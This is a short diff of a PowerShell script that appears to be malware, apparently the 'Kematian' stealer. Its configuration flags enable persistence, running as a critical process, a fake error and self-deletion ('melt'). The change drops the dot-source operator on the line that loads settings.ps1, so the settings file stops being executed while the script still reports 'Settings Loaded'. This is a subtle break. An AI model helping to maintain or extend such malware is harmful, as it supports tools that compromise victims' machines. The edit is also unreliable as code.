@@ -5,12 +5,11 @@ $criticalprocess = $true
 $melt = $false
 $fakeerror = $false
 $persistence = $true
-
 $settings = $false
 
 if (Test-Path -Path "$env:APPDATA\Kematian\settings.ps1") {
     $settings = $true
-    . "$env:APPDATA\Kematian\settings.ps1"
+    "$env:APPDATA\Kematian\settings.ps1"
     if ($debug) {
         Write-Host "[!] Settings Loaded" -ForegroundColor Green
     }
